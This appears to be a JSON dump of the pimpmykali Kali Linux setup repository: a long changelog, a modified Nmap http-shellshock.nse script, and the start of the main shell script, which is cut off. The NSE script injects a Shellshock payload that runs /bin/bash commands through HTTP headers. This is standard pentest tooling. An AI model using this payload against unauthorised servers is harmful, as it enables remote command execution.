Revision 1.4.0 - httprobe added\n  - added fix_httprobe to fix_missing function\n    - checks for /usr/bin/httprobe if not installed install it via kali repo\n  - function will be called via menu options\n    - 1 - fix missing\n    - 0 - fix all ( only runs 1 thru 8 )\n    - N - new vm setup\n    - H - standalone function\n  - added menu option H only this fix will be applied\n\n# Revision 1.3.9 - Kali 2021.4 Update\n  - creates symlink linking /bin/python2.7 to /bin/python\n  - python is python2.7\n  - python3 is python3.x\n  - pip is for python2.7 , pip3 is for python3.x\n    - function will be applied via menu options :\n      - 1 fix missing\n      - 0 fix all (runs only 1 thru 8)\n      - N New VM Setup\n      - ! Nuke Impacket\n  - pimpmykali-mirrors function update\n    - relaxed grep and sed to be more inclusive\n  - revision history 1.3.5 - 1.3.8 moved to changelog.txt\n\n# Revision 1.3.8 - Added dbus-x11\n  - Common issue with gedit added dbus-x11\n  - Menu options N, 0 and 1 will install dbus-x11\n\n# Revision 1.3.7 - Birthday Message Removed\n  - No code changes only birthday message was removed\n\n# Revision 1.3.6 - HAPPY BIRTHDAY PIMPMYKALI!!!!\n  - One year ago today, Pimpmykali was published to Github!!!\n  - Birthday message added to menu\n\n# Revision 1.3.5 - Pimpmykali-Mirrors Update\n  - grep and sed were too restrictive and have been updated\n  - now fully dynamic and less restrictive with mirror paths\n    - Thank you Alek for bringing this to my attention!\n  - added apt update at the end of pimpmykali-mirrors to update with the new mirror\n  - added loop for any other key pressed other than Y or N\n  - revision history for 1.3.2, 1.3.3 and 1.3.4 moved to changelog.txt\n\n# Revision 1.3.4 - amassf\n  - amass added precompiled binary\n    - Menu options N, 0 or 1 will install amass\n\n# Revision 1.3.3 - pyftpdlib\n  - pyftpdlib added for python\n    - Menu options N, 0 or 1 will install pyftpdlib\n\n# Revision 1.3.2 - Pimpmykali-Mirrors and updates\n  - Speedtest for kali linux repo mirrors (http only at this time)\n  - This function will only be executed via menu option =\n  - menu option = Pimpmykali-Mirrors (Yes it is literally the = (equals character)\n    - obtain kali mirror list and process\n      - round-trip-time ping test to all mirrors, select top 10 with shortest rtt\n      - small download >1MB from the top 10 mirrors, select top 5 fastest transfers\n      - large download 10MB test the final 5 mirrors, select fastest transfer\n    - generate new /etc/apt/sources.list with the new selected mirror\n      - prompt Y or N to write new changes to /etc/apt/sources.list\n        - Y writes changes /etc/apt/sources.list\n        - create backup of original sources.list in /etc/apt/sources.list_date_time\n        - write new deb and deb-src lines with new mirror to /etc/apt/sources.list\n        - N exits and makes no change to /etc/apt/sources.list\n  - added --mirrors for command line use sudo./pimpmykali.sh --mirrors\n\n  - new menu option T - reconfigure timezone (new function)\n    - calls sudo dpkg-reconfigure tzdata\n\n  - new menu option K - reconfigure keyboard, language, layout (new function)\n    - calls sudo dpkg-reconfigure keyboard-configuration\n\n  - menu option 6 - enable root login\n     - password prompt now checks exit code if failure, restart password function\n     - copy of files from /home/kali/* to /root now uses the actual username not just 'kali'\n\n  - menu option L - Sublime text editor\n    - installs sublime text editor\n\n  - functions updated: fix_smbconf fix_grub and fix_sources\n    - function updated to use sed -i instead of prior method\n\n  - Menu clean up, added bold color to \"New VM Setup\" Menu option N\n\n  - Added Sublime text editor installer - Menu Option L\n\n  - install_atom function\n    - removed quiet switches to avoid confusion\n\n  - python2 deprecation warnings - disabled\n\n  - Alphabetically sorted Main Menu - Stand Alone Functions\n\n  - Revision History for 1.3.1 and 1.3.0 moved to changelog.txt\n\n  - Yes, this really was just 1 update to pimpmykali\n  - Minor code cleanup\n\n# Revision 1.3.1 - Minor code cleanup\n  - Minor code cleanup\n\n# Revision 1.3.0 - TheMayor's Movement, Pivoting and Persistance course requirements for kali linux added\n  - This is a stand alone function and is not called by any other part of Pimpmykali\n  - Menu option M - setup for Mayors Movement, Pivoting and Persistance course\n    - installs covenant and all additional required packages\n    - downgrades msf to v5 ( auto-magic it is not going to ask about it )\n    - creates startup script for covenant /usr/local/bin/startcovenant.sh\n      - script checks if covenant is already running, if it is, kill covenant and start\n      - otherwise just start covenant\n    - startcovent.sh script is symlinked to /usr/local/bin/covenant for easy startup\n    - command line to start covenant is 'covenant' from anywhere as it is in the /usr/local/bin path\n    - creates desktop icon for \"Start Covenant\"\n      - final desktop icon for \"Start Covenant\" has not been finalized and may change without notice\n  - Added environment variable to remove restart services on apt upgrade, will now default to this setting\n  - Special Note:\n  - Pimpmykali has been stored in the github arctic vault! (dont ask for updates in 1000 years)\n\n# Revision 1.2.9\n  - Bug fix : Aksheet ( https://github.com/Aksheet10 ) Thank you!\n    - no revision change, minor fix no major impacket on Pimpmykali (pun intended)\n    - an apt -y remove impacket was still being called in options 5 and !\n      - removed line\n  - Code contribution pswalia2u!! Thank you!\n    - visit pswalia2u's github at https://github.com/pswalia2u\n    - Disable Gnome Power Management\n  - New Menu option P - Power management disable (standalone function)\n  - rewrite of disable power management functions\n    - new function disable_power_checkde\n      - check which desktop environment is running (xfce, gnome)\n      - disable power management for that environment\n    - new function disable_power_gnome (pswalia2u)\n    - disable_power_xfce replaces the following functions\n      - functions fix_xfce_user fix_xfce_root fix_xfce_power removed\n  - new function fix_hushlogin\n    - check for .hushlogin if file does not exist, create .hushlogin\n  - revision 1.2.8 history moved to changelog.txt\n  - code contributors section added to readme.md\n\nRevision 1.2.8 - Kali 2021.2 Updates\n  - Changed installation for VSCode to use code-oss from repo\n  - Virtualbox guest-os-tools were being installed twice - fixed\n  - Added check for atom, if already installed, skip installation\n  - misc minor fixes / cosmetic fixes\n  -\n  - Complete revision history has been moved to changelog.txt\n    - clean up the readme.md page\n    - Most recent update will always be displayed in readme.md (this page)\n    - Screenshot added to readme.md\n\nRevision 1.2.7 - Virtualbox Guest ISO Downloaded from virtualbox.org\n  - Virtualbox Guest OS Tools Only :\n   - An issue has arisen that the Kali repo has the incorrect version of the\n   - virtualbox guest os tools, function has been rewritten to always pull the\n   - most current version from download.virtualbox.org/LATEST directly not the kali repo\n\nRevision 1.2.6 - GoWitness Binary - Installed\n  - Gowitness Precompiled binary is downloaded and installed to /usr/bin/gowitness\n    - checks for google-chrome installation, if not installed, install it\n    - installs gowitness precompiled binary to /usr/bin/gowitness\n\nRevision 1.2.5 - Downgrade MSF to 5 re-enabled\n  - Downgrade from MSF 6 to 5 has been re-enabled\n    - due to a recent (somewhat odd) demand to re-enable the downgrade\n    - function has been re-enabled. Menu Option D only\n\nRevision 1.2.4 - added common missing items\n  - Added to menu options : 1 - Fix Missing, 0 - Fix All, and N - new vm setup\n    - install gcc-mingw-w64-x86-64-win32\n    - install libssl-dev\n    - install set\n  - Resolved an issue with vscode installer menu option v or V\n\nRevision 1.2.3 - fix_broken_xfce\n  - only_upgrade function modified\n      - function virt_what was called to early in only_upgrade\n    - fix_broken_xfce function is no longer necessary as of Kali 2021.1\n    - fix_broken_xfce removed from all script processing\n    - fix_broken_xfce has been moved to stand alone function\n      - not called by any other part of the script except (menu F)\n  - fix_broken_xfce (menu F)\n      - left as a stand alone function as a fail-safe for older versions of Kali\n      - fix_broken_xfce code and function will be removed completely at a future date\n  - fix_upgrade function modified\n    - virt_what function was called before run_update\n    - virt_what function moved, now called after run_update\n  - apt_update function added, now gives on screen display of running process function\n  - apt_upgrade function added, now gives on screen display of running process function\n  - apt_autoremove function added, now gives on screen display of running process function\n\n\nRevision 1.2.2 - A number of changes / updates\n  - Added Menu option C added - Install Google-Chrome (gowitness dependancy)\n  - Added google-chrome to fix_missing which will be activated by\n    - menu option 1 fix missing\n    - menu option 0 fix all\n    - menu option N new vm setup\n  - /etc/apt/sources.list function rewritten\n    - function will now only search for a specific line in sources.list\n    - \"#deb-src http://http.kali.org/kali kali-rolling main contrib non-free\" or\n    - \"deb-src http://http.kali.org/kali kali-rolling main contrib non-free\"\n    - if found, script will sed out the and enable deb-src\n    - no other modifications are made to sources.list\n  - Downgrade Metasploit function has been removed - Menu option D\n  - virt-what function upgraded, check added for already existing\n  - enable root login prompt moved in the script should appear sooner during execution\n\nRevision 1.2.1 - Menu Option N Modified\n  - minor code cleanup, no major changes.\n\nRevision 1.2.0 - Menu Option N Modified\n - Kali 2021.1 + MSF-6.0.30-DEV have been released live in the Kali Repo\n - Downgrade Metasploit has been removed from menu option N\n - Downgrade Metasploit is now only available via menu option D\n - Minor code cleanup\n\nRevision 1.1.9 - Gedit Connection Refused\n  - added fix for gedit as root connection refused\n  - Fix will be installed via :\n    - 1 - Fix Missing\n    - 0 - Fix All\n    - N - New VM Setup\n  - Menu item G to apply only this fix\n\nRevision 1.1.8 - Quality of life improvements\n  - Added install for theharvester\n  - xfce power management is now disabled\n    - fix_xfcepower fix_xfce_root fix_xfce_user\n      - will also be executed in menu option F - Fix Icons\n  - pc speaker beep now disabled /etc/modprobe.d/nobeep.conf\n    - silence_pcbeep\n  - Items will be installed via the following :\n    - 1 - Fix Missing\n    - 0 - Fix All (Runs only options 1 thru 8)\n    - N - New VM Setup\n  - Updated Readme.md documentation for menu items S, F\n  - Minor updates for a few prompts\n\nRevision 1.1.7 - libguestfs-tools cifs-utils added\n  - libguestfs-tools added to fix_missing\n  - cifs-utils added to fix_missing\n  - Items will be installed via the following :\n    - 1 - Fix Missing\n    - 0 - Fix All (Runs only options 1 thru 8)\n    - N - New VM Setup\n\nRevision 1.1.6 - update to curl get-pip.py\n  - script has been updated to point directly to the python2.7 get-pip.py\n\nRevision 1.1.5 - Fix SPIKE\n  - menu option S to apply this fix only\n  - fix_spike will be applied thru the following menu options automatically\n    - 1 - Fix Missing (fix_spike is a part of fix_missing)\n    - 0 - Fix All (Runs only options 1 thru 8)\n    - N - New VM Setup\n  - current version of spike2.9-1kali7 throws undefined symbol error\n  - removes spike2.9-1kali7\n  - installs spike_2.9-1kali6 (reverts spike to prior version)\n  - apt adds hold to spike to prevent accidental future upgrades\n  - apt hold will be removed at a future date once 2.9-1kali7 issues are resolved\n\nRevision 1.1.4 - Fix Broken XFCE Icons\n  - menu option F to apply this fix only\n    - Menu N and 9 will apply fix automatically as a part of their function\n  - restores FileManager (Folder Icon on Taskbar) function\n  - restores TerminalEmulator (Terminal Icon) function\n  - restores \"File System\" icon on desktop function\n  - restores \"Home\" icon on desktop function\n\nRevision 1.1.3 - added Are you sure prompt\n  - Added \"Are you sure you want to copy all files from /home/kali to /root\" prompt\n  - Gives the user a last chance to abort the function\n  - There are no major functional changes between 1.1.2 and 1.1.3 other than the additional\n    prompt to the copy /home/kali to /root function\n  - Answering Y - performs copy function of /home/kali to /root\n  - Answering N - skips copy function and proceeds on to the next section of the script\n\nRevision 1.1.2 - copy /home/kali to /root screen and prompt\n  - 1.1.2 Notes updated to reflect 1.1.3 addition and changes to 1.1.2 function\n  - Recently there have been a number of users wanting to run as root in kali but finding there\n    are no files or directories in /root once the root login is enabled and they login as root.\n\n    This is the default as root was disabled, there is nothing in /root\n\n  - This function ONLY executes If the user selects Yes at the enable root login prompt\n\n  - A second screen and prompt was added to the Enable Root Login function\n    - Prompts the user to copy everything from /home/kali to /root (And we mean everything!)\n    - Answering Y - will prompt user for \"Are you sure?\" added in 1.1.3\n    - Answering N - will skip the copy and end this function\n  - No file-checking will be performed\n  - Warning: This WILL overwrite anything in /root with the contents of /home/kali if Yes is selected\n  - Function does NOT remove anything from /home/kali\n\nRevision 1.1.1 - quick fix\n  - Quick fix applied to modifiy a specific function that was calling\n  - the exit_screen when it should not have been\n\nRevision 1.1.0 - python module: xlrd added\n  - added pip install xlrd==1.2.0 to fix missing\n  - general code cleanup\n  - Thank you to hackza for testing functions on Mac Vmware Fusion!\n\nRevision 1.0.9 - Qemu/Libvirt Detection added\n  - Thank you m4ul3r! It was his idea and testing that we are able to add this!\n  - detection of \"kvm\" hypervisor\n  - upon that detection xserver-xorg-video-qxl spice-vdagent are installed\n\nRevision 1.0.8 - New Menu Item n or N\n  - function will run fix_all, fix_missing, downgrade metasploit and pimpmyupgrade\n  - executes menu options 0, D and 9 from a single menu item.\n  - On-screen Menu display has been reworked and cleaned up a bit\n  - This saves the user from running menu 0, then running D then running 9 individually.\n\nRevision 1.0.7 - GOPATH statements added to .zshrc and .bashrc\n  - function will check for GOPATH in .zshrc and .bashrc\n  - Checks added for root and regular users\n  - if \"GOPATH\" is not found in .zshrc or .bashrc, statements will be added:\n    - export GOPATH=$HOME/go\n    - export PATH=$PATH:$GOPATH/bin\n  - if \"GOPATH\" is found in .zshrc or .bashrc, no changes will be made\n  - Menu Options 0 (Fix All), 1 (Fix Missing) or 3 (Fix GoLang) will activate this function\n\nRevision 1.0.6 - theHarvester fix removed\n  - Python3.9.1 has arrived! No longer in Release Candidate status!\n  - theHarvester fix is no longer necessary and has been commented as of this Revision\n  - if no further complications, code will be removed completely\n\nRevision 1.0.5 - Gedit returns!\n  - gedit has been added to fix_all and fix_missing functions\n\nRevision 1.0.4 - fix theHarvester (removed in 1.0.6)\n - This is only to be used in the following case :\n   - Menu option H and will only be called via menu option H\n   - Kali 2020.4 has been apt upgraded and python3.9 is installed\n   - theHarvester is not functioning and is getting an error on uvloop\n   - this will set python3 to default to python3.9\n   - git clones uvloop, applies fixes and recompiles\n   - git clones theHarvester, applies fixes and installs\n - additional checks will be added in the future\n\nRevision 1.0.3 - Metasploit 6 to Metasploit 5 Downgrade Option / Apt Upgrade returns!\n  - Menu option D has been added to perform the downgrade\n    - will not be called by any other function\n    - only menu option D will execute the downgrade\n    - metasploit will complain about 2 versions of reline being installed but do not believe it is an issue\n    - places a hold on metasploit-framework so it will not be upgraded in the future\n  - Pimpmyupgrade menu option 9\n    - set as a stand alone function, and will not be called from any other function in the script\n    - apt upgrade will only be called from this function\n    - mark metasploit-framework to be ignored in the upgrade process\n    - perform apt upgrade without upgrading metasploit-framework\n    - unmark metasploit-framework from being held back\n  - Fix All menu option 0 (modified)\n    - now only runs menu options 1 thru 8 , does not include menu 9 (pimpmyupgrade)\n\nRevision 1.0.2 - Apt Upgrade Commented Out\n  - Due to Metasploit being upgraded from msf5 -> MSF6\n    apt upgrade has been commented out and will NOT be run\n    at this time.\n\nRevision 1.0.1 Python-Requests\n  - added python requests and colorama installations to fix_missing (menu option 1) and (menu option 0) fix_all\n\nRevision 1.0.0 Atom replaces Gedit\n  - pimpmykali has reached a state of consistency and stability in the function it performs\n    version is being bumped to v1.0.0 to be more in line with version numbering standards.\n  - Atom has replaced gedit, gedit will no longer be installed by pimpmykali\n\nRevision 0.5j - rockyou.txt.gz\n  - added fix_rockyou function\n  - added gzip -dq /usr/share/wordlists/rockyou.txt.gz\n   - fix_missing and fix_all both call this function\n  - added restart-vm-tools as a part of menu 9 pimpmyupgrade\n  - added fix for bad apt hash issue (automatically applied)\n  - revision is going to be bumped to v1.0.0 upon next release\n\nRevision 0.5i - virtualbox specific fixes\n   - virtualbox-guest-addditions-iso added to check_vm as a part of fix_upgrade\n   - VBoxLinuxAdditions.run execution added to check_vm as a part of fix_upgrade\n   - '/sbin/rcvboxadd quicksetup all' added to check_vm as a part of fix_upgrade\n\nRevision 0.5h\n   - minor code cleanup\n   - 2nd warning screen of nuke impacket has been disabled and will no longer show\n   - removed --borked from main menu system as the ! menu item is now available\n   - added htop to fix_missing\n\nRevision 0.5g\n   - minor updates\n   - moved wait_time, finduser and groups to global vars from local vars\n   - general cleanup of script, comments, etc\n   - 2nd warning screen of nuke impacket has been disabled and will no longer show\n\nRevision 0.5f\n   - flameshot, gedit and seclists have been removed from fix_missing and\n   - now will only be a part of fix_all or as an individual Option for installation\n   - only command line switches with -- are now valid all others have been removed\n   - all revision history except for the most 3 recent have been removed from the script\n   - full revision history can be found here in REAME.md\n\nRevision 0.5e\n   - Nuke Impacket added to menu, enter character ! to run nuke impacket\n   - issues with people understanding how to use --borked on the command line\n     a menu option of character ! was added to ease use of the nuke impacket function.\n     the command:  sudo ./pimpmykali.sh --bored   was used to call the nuke-impacket\n     function now thanks to a new menu item of ! it can be called from the menu system\n     directly without the need for command line switches, but the switch is still available\n   - command line switches with a single - or just the name have been removed all command line\n     switches are now --nameofswtich as per the --help system indicates\n\nRevision 0.5d\n   - bugfix Thank you to @AES ! for finding the bug, nmap wget script was pulling the wrong page\n   - correct page has been added new version git pushd\n   - unfortunatly versions 0.5c thru 0.4 are affected if you have an old version\n     or havent ran pimpmykali.sh please git clone a fresh copy and re-run the nmap from the menu\n     Menu Option 8 - Fix clamav-exec.nse\n   - corrected http-shellshock.nse nmap script added - Thank you Alek & Blob!\n\nRevision 0.5c\n   - fix_upgrade removed from fix_missing\n   - fix_upgrade removed from fix_missing and is no longer 'forced' as a part of fix_missing\n   - fix_upgrade will now only be called as a part of fix_all (menu 0) or fix_upgrade (menu 9)\n     or command line switches --upgrade -upgrade or upgrade\n   - general code cleanup, some additional comments added\n\nRevision 0.5b - The Essentials\n   - Blindpentesters Essential Collection added\n   - added Blindpentesters 'The Essentials' tools and utils collection\n   - menu option 'B' for blindpentesters tools collection, installs, runs the_essentials.sh and exits\n\nRevision 0.5a\n  - minor cosmetic fixes to pimpmyupgrade functions\n\nRevision 0.5\n   - pimpmyupgrade added\n   - fix_sources deb-src is not enabled in /etc/apt/sources.list - fixed\n   - linux-headers-(uname -r) are not installed - fixed\n   - new functions check_vm, virt_what, run_update are what comprise pimpmyupgrade\n   - virt_what determines if vm is under virtualbox or vmware\n   - check_vm checks for virtualbox or vmware and installs proper drivers for each\n   - run_update runs fix_sources, runs apt upgrade calls virt_what, calls check_vm\n\nRevision 0.4b\n   - minor updates\n   - reworked fix_section works much better now\n   - added slient 'mode' variable, uncomment silent= line to turn output on and off from apt etc\n   - misc cleanup in the script\n\nRevision 0.4a\n   - 2nd warning screen added for --borked impacket removal system\n   - If you cant have a little fun with your own scripts your doing something wrong....\n   - last chance warning screen ( mostly novelty ), random launch code generation on each run of --borked\n   - list of target selection, targets locked, etc\n   - seriously if you made it to --borked 2nd warning your having a bad day with impacket.. enjoy the giggle\n   - 10 second wait timer added to last chance launch screen before operations are performed\n   - if no ctrl+c is entered to cancel the operation, fix_sead is run, followed by fix_impacket\n   - added apt -y reinstall python3-impacket impacket-scripts to fix error with smbmap after impacket removal\n\nRevision 0.4\n   - Major Update for impacket removal\n   - added flameshot as a part of the missing group to be installed\n   - added clamav-exec.nse wget to fix clamav-exec.nse failed during nmap --script vuln scans\n   - new commandline switch of --borked has been implemented for removal of impacket across various locations\n   - added --borked notice to menu system, help system\n   - added warning screen for --borked, only input of Y will proceed anything else exits\n   - fix_sead_warning, fix_sead_run, fix_impacket_array, fix_impacket all executed in order with --borked\n     - fix_sead_run removes any and all directories named impacket* in the following locations (you have been warned):\n        /opt /usr/bin /usr/local/lib /usr/lib /home/$finduser/.local/bin /home/$finduser/.local/lib ~/.local/lib ~/.local/bin\n      - fix_sead_run, also removes via fix_impacket_array any .py or .pyc related to impacket in the following:\n        /usr/bin/$impacket_file /usr/local/bin/$impacket_file\n         (root)~/.local/bin/$impacket_file\n         (user)/home/$finduser/.local/bin/$impacket_file\n\nRevision 0.3d\n  - added flameshot to fix_missing as a part of the default installed tools\n  - emergency fix to --force, everything should be functioning now\n\nRevision 0.3c\n  - per request kali-root-login enabling prompt has been reworked and reworded to be less confusing and\n    to give the user a better explanation of what the script is doing at that stage\n  - added to note that if you dont understand what this part of the script is doing hit N\n  - added colors for syntax highlighting in the onscreen messages of the script in places\n  - added fix_nmap function for fixing /usr/share/nmap/scripts/clamav-exec.nse (commented out at this time\n    clamav-exec.nse was an issue at one time but unknown if it is still relevent)\n  - --force command line argument was being called without setting $force in fix_all $force - fixed\n\nRevision 0.3b\n  - bug fix impacket installation was missing cd /opt/impacket-0.9.19\n  - feature request added : Gedit installation menu option 7, is included in fix_missing, all and force\n  - remove clear from exit screen\n\nRevision 0.3a\n- the extraction of the impacket-0.9.19.tar.gz was leaving /opt/impacket-0.9.19 with 700 perms\n  and an ownership of 503:root, this has been changed to ownership root:root and all files inside\n  /opt/impacket-0.9.19 have had their permissions set to 755 after extraction of impacket-0.9.19.tar.gz\n- Ascii art added to the menu\n\nRevision 0.3\n- added checks for already installed installations, added --force command ( --force will run all fixes/reinstalls )\n- fix_impacket function : added both .py and .pyc files to impacket removal array\n  - added on screen notification of files being removed by the array\n- fix_missing function  : has been reworked new vars check section force type\n  - added fix_section function : fix_section is the workhorse for fix_missing\n- reworked python-pip installation to its own function python-pip-curl and installs python-pip via curl\n\nRevision 0.2\n- Added colorized notifications, help system, command line arguments, case based menu system\n- valid command line arguments are: help, all, go, grub, impacket, missing, menu, smb, grub, root\n- anything other than --all or -all or all , will only run that function and then exit.\n- command line arguments can be used with -- or - or just the word itself to try can catch for all possible cases\n- example command line var: --help or -help or help will catch help and works for all valid command line arguments\n  anything other the command line arugement catch exits and displays help\n"
        },
        {
          "name": "fixed-http-shellshock.nse",
          "type": "blob",
          "size": 3.763671875,
          "content": "local http = require \"http\"\nlocal shortport = require \"shortport\"\nlocal stdnse = require \"stdnse\"\nlocal string = require \"string\"\nlocal vulns = require \"vulns\"\nlocal rand = require \"rand\"\n\ndescription = [[\nAttempts to exploit the \"shellshock\" vulnerability (CVE-2014-6271 and CVE-2014-7169) in web applications.\n\nTo detect this vulnerability the script executes a command that prints a\nrandom string and then attempts to find it inside the response body. Web apps that\n don't print back information won't be detected with this method.\n\nBy default the script injects the payload in the HTTP headers User-Agent,\n Cookie, Referer and also uses the payload as the header name.\n\nVulnerability originally discovered by Stephane Chazelas.\n\nReferences:\n* http://www.openwall.com/lists/oss-security/2014/09/24/10\n* http://seclists.org/oss-sec/2014/q3/685\n* https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169\n* http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271\n]]\n\n---\n-- @usage\n-- nmap -sV -p80 --script http-shellshock --script-args uri=/cgi-bin/bin,cmd=whoami <target>\n--\n-- @args http-shellshock.uri URI. Default: /\n-- @args http-shellshock.header HTTP header to use in requests. Default: User-Agent\n-- @args http-shellshock.cmd Custom command to send inside payload. Default: nil\n---\nauthor = {\"Paulino Calderon <calderon()websec.mx\",\"Paul Amar <paul()sensepost com>\"}\nlicense = \"Same as Nmap--See https://nmap.org/book/man-legal.html\"\ncategories = {\"exploit\",\"vuln\",\"intrusive\"}\n\nportrule = shortport.http\n\nfunction generate_http_req(host, port, uri, custom_header, cmd)\n  local rnd = nil\n  --Set custom or probe with random string as cmd\n  if cmd ~= nil then\n    cmd = '() { :;}; echo; /bin/bash -c '..cmd\n else\n    rnd = rand.random_alpha(15)\n    cmd = '() { :;}; echo; echo \"'..rnd..'\"'\n  end\n  -- Plant the payload in the HTTP headers\n  local options = {header={}}\n  options[\"no_cache\"] = true\n  if custom_header == nil then\n    stdnse.debug1(\"Sending '%s' in HTTP headers:User-Agent,Cookie and Referer\", cmd)\n    options[\"header\"][\"User-Agent\"] = cmd\n    options[\"header\"][\"Referer\"] = cmd\n    options[\"header\"][\"Cookie\"] = cmd\n--    options[\"header\"][cmd] = cmd\n  else\n    stdnse.debug1(\"Sending '%s' in HTTP header '%s'\", cmd, custom_header)\n    options[\"header\"][custom_header] = cmd\n  end\n  local req = http.get(host, port, uri, options)\n\n  if not(cmd) then\n    return req\n  else\n    return req, rnd\n  end\nend\n\naction = function(host, port)\n  local cmd = stdnse.get_script_args(SCRIPT_NAME..\".cmd\") or nil\n  local http_header = stdnse.get_script_args(SCRIPT_NAME..\".header\") or nil\n  local uri = stdnse.get_script_args(SCRIPT_NAME..\".uri\") or '/'\n  local rnd = nil\n  local req, rnd = generate_http_req(host, port, uri, http_header, nil)\n  if req.status == 200 and string.match(req.body, rnd) ~= nil then\n    local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)\n    local vuln = {\n      title = 'HTTP Shellshock vulnerability',\n      state = vulns.STATE.NOT_VULN,\n      description = [[\nThis web application might be affected by the vulnerability known as Shellshock. It seems the server\nis executing commands injected via malicious HTTP headers.\n      ]],\n      IDS = {CVE = 'CVE-2014-6271'},\n      references = {\n        'http://www.openwall.com/lists/oss-security/2014/09/24/10',\n        'http://seclists.org/oss-sec/2014/q3/685',\n        'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169'\n      },\n      dates = {\n        disclosure = {year = '2014', month = '09', day = '24'},\n      },\n    }\n    stdnse.debug1(\"Random pattern '%s' was found in page. Host seems vulnerable.\", rnd)\n    vuln.state = vulns.STATE.EXPLOIT\n    if cmd ~= nil then\n       req = generate_http_req(host, port, uri, http_header, cmd)\n       vuln.exploit_results = req.body\n    end\n    return vuln_report:make_output(vuln)\n  end\nend\n"
        },
        {
          "name": "pimpmykali.sh",
          "type": "blob",
          "size": 109.599609375,
          "content": "#!/bin/bash\n#\n# pimpmykali.sh  Author: Dewalt\n# git clone https://github.com/Dewalt-arch/pimpmykali \n# Usage: sudo ./pimpmykali.sh  ( defaults to the menu system )\n# command line arguments are valid\n#\n# Full Revision history can be found in changelog.txt\n# Standard Disclaimer: Author assumes no liability for any damage\n\n# revision var\n    revision=\"2.0.0\"\n\n# prompt colors\n    red=$'\\e[1;31m'\n    green=$'\\e[1;32m'\n    blue=$'\\e[1;34m'\n    magenta=$'\\e[1;35m'\n    cyan=$'\\e[1;36m'\n    yellow=$'\\e[1;93m'\n    white=$'\\e[0m'\n    bold=$'\\e[1m'\n    norm=$'\\e[21m'\n    reset=$'\\e[0m'\n    spaces='       '\n\n# status indicators\n    greenplus='\\e[1;33m[++]\\e[0m'\n    greenminus='\\e[1;33m[--]\\e[0m'\n    redminus='\\e[1;31m[--]\\e[0m'\n    redexclaim='\\e[1;31m[!!]\\e[0m'\n    redstar='\\e[1;31m[**]\\e[0m'\n    blinkexclaim='\\e[1;31m[\\e[5;31m!!\\e[0m\\e[1;31m]\\e[0m'\n    fourblinkexclaim='\\e[1;31m[\\e[5;31m!!!!\\e[0m\\e[1;31m]\\e[0m'\n\n# variables needed in the script\n    force=0\n    check=\"\"\n    section=\"\"\n    type=\"\"\n    menu=\"\"\n    pipnowarn=\"--no-python-version-warning\"\n    export PYTHONWARNINGS=\"ignore\"\n    nessusd_service_active=0\n\n# variables moved from local to global\n    finduser=$(logname)\n    detected_env=\"\"\n    menuinput=\"\"\n   \n    pyver=$(python3 --version | awk '{print$2}' | cut -d \".\" -f1-2)\n   \n    archtype=$(uname -m)\n    if [ \"$archtype\" == \"aarch64\" ]; \n      then \n        arch=\"arm64\"\n    fi\n\n    if [ \"$archtype\" == \"x86_64\" ]; \n      then\n        arch=\"amd64\"\n    fi\n\n# logging\n    LOG_FILE=pimpmykali.log\n    exec > >(tee ${LOG_FILE}) 2>&1\n\n# silent mode\n    silent=''                  # uncomment to see all output\n    #silent='>/dev/null 2>&1' # uncomment to hide all output\n    export DEBIAN_FRONTEND=noninteractive\n    export PYTHONWARNINGS=ignore\n\n# minimize apt updates\n    APT_UPDATE_RAN=0\n\n# Variables used with --auto, --autonoroot and make_rootgreatagain functions\n    SPEEDRUN=0\n    ENABLE_ROOT=0\n\n\ncheck_distro() {\n    distro=$(uname -a | grep -i -c \"kali\") # distro check\n    if [ $distro -ne 1 ]\n     then echo -e \"\\n ${redexclaim} Kali Linux Not Detected - WSL/WSL2/Anything else is unsupported ${redexclaim} \\n\"; exit\n    fi\n\n    # check for tracelabs osint vm, if found exit\n    findhostname=$(hostname)\n    findrelease=$(cat /etc/os-release | grep -i -c -m1 \"2022.1\")\n    if [[ \"$finduser\" == \"osint\" ]] && [[ \"$findhostname\" == \"osint\" ]] && [[ $findrelease -ge 1 ]]\n     then \n      echo -e \"\\n  ${redexclaim} Tracelabs Osint VM Detected, exiting\"\n      exit\n    fi \n    }\n\n\ncheck_for_root() {\n    if [ \"$EUID\" -ne 0 ]\n      then echo -e \"\\n\\n Script must be run with sudo ./pimpmykali.sh or as root \\n\"\n      exit\n    else\n      # Remove any prior hold on metasploit-framework at startup\n      eval apt-mark unhold metasploit-framework >/dev/null 2>&1\n    fi\n    }\n\n\nclean_vars() {\n    APP=\"\"\n    EXIT_STATUS=\"\"\n    FUNCTYPE=\"\"\n    }\n\n\ncheck_exit_status() {\n    case ${EXIT_STATUS} in \n        0) ;; \n        1) echo -e \"\\n${spaces}${redexclaim} ${APP} ${FUNCTYPE} General Error Exit Status: ${EXIT_STATUS}\\n\"; exit 1;;\n        2) echo -e \"\\n${spaces}${redexclaim} ${APP} ${FUNCTYPE} Misuse of Shell commands, Exit Status: ${EXIT_STATUS}\\n\"; exit 2;;\n      100) echo -e \"\\n${spaces}${redexclaim} ${APP} ${FUNCTYPE} Mirror sync in progress try again later, Exit Status: ${EXIT_STATUS}\\n\"; exit 100;;\n      126) echo -e \"\\n${spaces}${redexclaim} ${APP} ${FUNCTYPE} Command Invoked Cannot Execute, Exit Status ${EXIT_STATUS}\\n\"; exit 126;;\n      127) echo -e \"\\n${spaces}${redexclaim} ${APP} ${FUNCTYPE} Command Not Found, Exit Staus: ${EXIT_STATUS}\\n\"; exit 127;;\n      128) echo -e \"\\n${spaces}${redexclaim} ${APP} ${FUNCTYPE} Invalid Arguement to Exit, Exit Status: ${EXIT_STATUS}\\n\"; exit 128;;\n      255) echo -e \"\\n${spaces}${redexclaim} ${APP} ${FUNCTYPE} Exit status out of range, Exit Status: ${EXIT_STATUS}\\n\"; exit 255;;\n        *) echo -e \"\\n${spaces}${redexclaim} Exit Status ${EXIT_STATUS} for ${APP} ${FUNCTYPE} status: failed\\n\";;\n    esac\n    }\n\n\nis_installed() {\n    app=\"$@\"\n\n    for each_app in ${app}\n    do\n      echo -e \"\\n  ${greenplus} Checking if ${each_app} is installed\"\n\n      is_app_installed=$(apt-cache policy ${each_app} | grep -i -c \"Installed: (none)\")\n\n      if [[ $is_app_installed -ge 1 ]]\n      then\n        clean_vars\n        APP=\"apt\"\n        FUNCTYPE=\"install ${each_app}\"\n        echo -e \"${spaces}${greenplus} 